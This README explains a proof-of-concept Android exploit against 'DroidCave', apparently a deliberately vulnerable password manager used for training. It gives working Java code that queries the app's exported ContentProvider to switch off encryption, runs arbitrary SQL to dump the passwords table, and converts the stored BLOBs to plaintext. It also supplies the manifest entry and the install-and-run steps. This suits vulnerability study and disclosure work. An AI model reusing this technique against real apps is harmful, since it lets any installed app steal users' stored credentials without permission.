# DroidCave Exploit - MainActivity Code Explanation

This repository contains a proof-of-concept (POC) Android application that demonstrates a critical vulnerability in the **DroidCave** password manager. The app exploits an unprotected `ContentProvider` to disable encryption and retrieve all stored passwords in plaintext, without requiring any special permissions.

## Overview

The `MainActivity` class is the core of the exploit. It performs two main actions when the user clicks a single button:

1. **Disables encryption** by calling the `disable_encryption` URI exposed by DroidCave's `PasswordContentProvider`.
2. **Retrieves all passwords** by executing a raw SQL query (`SELECT * FROM passwords`) via the `execute_sql` URI, then decrypts the BLOB fields (which now contain plaintext bytes) into readable strings.

## How the Exploit Works

### 1. Disable Encryption
```java
Uri disableUri = Uri.parse("content://com.eightksec.droidcave.provider/disable_encryption");
Cursor disableCursor = resolver.query(disableUri, null, null, null, null);
```
This triggers the code inside DroidCave's `ContentProvider` (case 7) that:
- Changes the encryption setting to `false`.
- Iterates through all passwords, decrypts them using the app's internal `EncryptionService`, and stores the plaintext bytes back into the database.
- Returns a status message.

### 2. Retrieve Passwords via `execute_sql`
```java
Uri sqlUri = new Uri.Builder()
        .scheme("content")
        .authority("com.eightksec.droidcave.provider")
        .appendPath("execute_sql")
        .appendPath("SELECT * FROM passwords")
        .build();

Cursor cursor = resolver.query(sqlUri, null, null, null, null);
```
This uses the `execute_sql` endpoint (case 5 in the provider) to run an arbitrary SQL query. The provider directly executes the query on its database and returns a `Cursor` containing all rows and columns.

### 3. Convert BLOB to Plaintext
```java
if (type == Cursor.FIELD_TYPE_BLOB) {
    byte[] blob = cursor.getBlob(columnIndex);
    String text = new String(blob, StandardCharsets.UTF_8);
    // Append to output
}
```
After decryption, the `password` column is still stored as a `BLOB`, but now it holds the UTF-8 bytes of the plaintext password. We read those bytes and convert them to a string for display.

## Key Points in the Code

- **`Uri.Builder`**: Ensures proper encoding of the SQL query string (spaces become `%20`, etc.).
- **`<queries>` element in `AndroidManifest.xml`**: Required for Android 11+ to allow visibility of the target package (`com.eightksec.droidcave`).
- **No permissions needed**: The exploit uses only the `ContentResolver` with publicly exported URIs.
- **Error handling**: Catches `SecurityException` and other exceptions to provide meaningful feedback.

## Manifest Requirement

Add this inside `<manifest>` to enable interaction with DroidCave on modern Android versions:

```xml
<queries>
    <package android:name="com.eightksec.droidcave" />
</queries>
```

## Testing the Exploit

1. Install the original DroidCave app and create some password entries (enable encryption in its settings if desired).
2. Install this POC app (`com.nasr.droidcavepoc`) on the same device.
3. Launch the POC app and press the button.
4. The screen will display:
   - The result of disabling encryption.
   - The number of passwords found.
   - Each password's details (including the plaintext password).

## Why This Works

- DroidCave's `ContentProvider` is **exported** (`android:exported="true"`) and defines no permission requirements, allowing any app to access it.
- The `disable_encryption` URI provides a direct way to turn off encryption and decrypt all data.
- The `execute_sql` URI allows arbitrary queries, including reading the entire `passwords` table.

This combination of flaws makes it trivial to extract all credentials.

---

*For a full understanding of the vulnerability, refer to the analysis of DroidCave's `PasswordContentProvider`.*
